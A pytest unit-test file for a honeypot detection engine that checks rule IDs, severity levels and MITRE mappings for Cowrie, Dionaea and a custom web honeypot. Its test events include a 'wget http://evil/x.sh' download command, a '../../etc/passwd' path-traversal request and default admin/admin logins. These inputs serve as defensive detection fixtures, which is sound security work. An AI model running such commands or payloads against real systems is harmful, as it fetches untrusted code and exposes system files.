"""
Unit tests for the detection engine (app/detect.py).

These pin the rule IDs, severity levels and MITRE mappings that the whole
project depends on, so a change to the rules that breaks the local↔Wazuh
contract fails CI instead of silently drifting.

Tests drive the public `detect(honeypot, event)` entry point (which returns
plain dicts), the same call the collector makes. detect.py has no database or
network dependency, so these run standalone.
"""
import itertools

import pytest

from app.detect import band, detect, top_detection, prune_trackers

# unique-IP generator so brute-force state never leaks between tests
_ips = (f"203.0.113.{i}" for i in itertools.count(1))


@pytest.fixture(autouse=True)
def _clean_trackers():
    prune_trackers()
    yield
    prune_trackers()


def cowrie(ev):
    return detect("cowrie", ev)


def dionaea(ev):
    return detect("dionaea", ev)


def webtrap(ev):
    return detect("webtrap", ev)


def rule_ids(dets):
    return {d["rule_id"] for d in dets}


# ---- severity banding ----

@pytest.mark.parametrize("level,expected", [
    (12, "critical"), (10, "critical"), (9, "high"), (8, "high"),
    (7, "medium"), (6, "medium"), (5, "low"), (3, "low"), (2, "info"), (0, "info"),
])
def test_band(level, expected):
    assert band(level) == expected


# ---- Cowrie ----

def test_cowrie_login_failed_default_account():
    dets = cowrie({"eventid": "cowrie.login.failed", "username": "root",
                   "password": "x", "src_ip": next(_ips)})
    ids = rule_ids(dets)
    assert 100101 in ids            # login attempt
    assert 100108 in ids            # password captured
    assert 100111 in ids            # default account


def test_cowrie_breach_is_critical():
    dets = cowrie({"eventid": "cowrie.login.success", "username": "admin",
                   "password": "admin", "src_ip": next(_ips)})
    top = top_detection(dets)
    assert top["rule_id"] == 100150
    assert top["level"] == 10
    assert top["severity"] == "critical"


def test_cowrie_suspicious_command():
    dets = cowrie({"eventid": "cowrie.command.input",
                   "input": "wget http://evil/x.sh", "src_ip": next(_ips)})
    ids = rule_ids(dets)
    assert 100103 in ids            # command executed
    assert 100104 in ids            # suspicious network command
    assert top_detection(dets)["level"] == 10


def test_cowrie_benign_command_not_flagged_malicious():
    dets = cowrie({"eventid": "cowrie.command.input",
                   "input": "ls -la", "src_ip": next(_ips)})
    assert rule_ids(dets) == {100103}


def test_cowrie_brute_force_fires_after_threshold():
    ip = next(_ips)
    fired = False
    for _ in range(5):
        dets = cowrie({"eventid": "cowrie.login.failed", "username": "x",
                       "password": "y", "src_ip": ip})
        fired = fired or 100107 in rule_ids(dets)
    assert fired, "brute-force rule 100107 should fire within 5 failures"


def test_cowrie_no_brute_force_below_threshold():
    ip = next(_ips)
    dets = []
    for _ in range(3):
        dets = cowrie({"eventid": "cowrie.login.failed", "username": "x",
                       "password": "y", "src_ip": ip})
    assert 100107 not in rule_ids(dets)


# ---- Dionaea (multi-protocol) ----

@pytest.mark.parametrize("proto,rule", [
    ("ftp", 100206), ("http", 100207), ("smb", 100201),
    ("mssql", 100209), ("mysql", 100209),
])
def test_dionaea_connection_per_protocol(proto, rule):
    dets = dionaea({"eventid": "dionaea.connection", "protocol": proto,
                    "src_ip": next(_ips)})
    assert rule in rule_ids(dets)


def test_dionaea_ftp_login_captures_credential():
    dets = dionaea({"eventid": "dionaea.ftp.login", "protocol": "ftp",
                    "username": "admin", "password": "admin", "src_ip": next(_ips)})
    ids = rule_ids(dets)
    assert 100216 in ids            # ftp credential captured
    assert 100111 in ids            # default account


def test_dionaea_ftp_brute_force():
    ip = next(_ips)
    fired = False
    for _ in range(5):
        dets = dionaea({"eventid": "dionaea.ftp.login", "protocol": "ftp",
                        "username": "u", "password": "p", "src_ip": ip})
        fired = fired or 100217 in rule_ids(dets)
    assert fired


def test_dionaea_malware_capture_is_critical():
    dets = dionaea({"eventid": "dionaea.download.complete", "protocol": "smb",
                    "message": "Stored binary sha256:deadbeef", "src_ip": next(_ips)})
    top = top_detection(dets)
    assert top["rule_id"] == 100205
    assert top["level"] == 12


def test_dionaea_known_exploit_keyword():
    dets = dionaea({"eventid": "dionaea.alert", "protocol": "smb",
                    "message": "MS17-010 EternalBlue attempt", "src_ip": next(_ips)})
    assert 100208 in rule_ids(dets)


def test_aggressive_scan_correlates():
    ip = next(_ips)
    fired = False
    for _ in range(10):
        dets = dionaea({"eventid": "dionaea.connection", "protocol": "smb", "src_ip": ip})
        fired = fired or 100210 in rule_ids(dets)
    assert fired


# ---- Webtrap (self-written HTTP honeypot) ----

@pytest.mark.parametrize("eid,rule", [
    ("webtrap.request", 100301), ("webtrap.recon", 100302),
    ("webtrap.credential", 100303), ("webtrap.scanner", 100304),
    ("webtrap.exploit", 100305),
])
def test_webtrap_event_maps_to_rule(eid, rule):
    dets = webtrap({"eventid": eid, "path": "/wp-login.php", "src_ip": next(_ips)})
    assert rule in rule_ids(dets)


def test_webtrap_exploit_is_critical():
    dets = webtrap({"eventid": "webtrap.exploit",
                    "path": "/?page=../../etc/passwd", "src_ip": next(_ips)})
    assert top_detection(dets)["level"] == 10
    assert top_detection(dets)["mitre"] == "T1190"


def test_webtrap_credential_default_account():
    dets = webtrap({"eventid": "webtrap.credential", "username": "admin",
                    "password": "admin", "src_ip": next(_ips)})
    ids = rule_ids(dets)
    assert 100303 in ids and 100111 in ids


def test_webtrap_aggressive_scan_correlates():
    ip = next(_ips)
    fired = False
    for _ in range(15):
        dets = webtrap({"eventid": "webtrap.recon", "path": "/x", "src_ip": ip})
        fired = fired or 100306 in rule_ids(dets)
    assert fired


# ---- routing + helpers ----

def test_detect_returns_dicts_with_expected_keys():
    dets = cowrie({"eventid": "cowrie.session.connect", "src_ip": next(_ips)})
    assert dets and set(dets[0]) >= {"rule_id", "level", "severity", "mitre", "tactic"}


def test_top_detection_empty():
    assert top_detection([]) is None
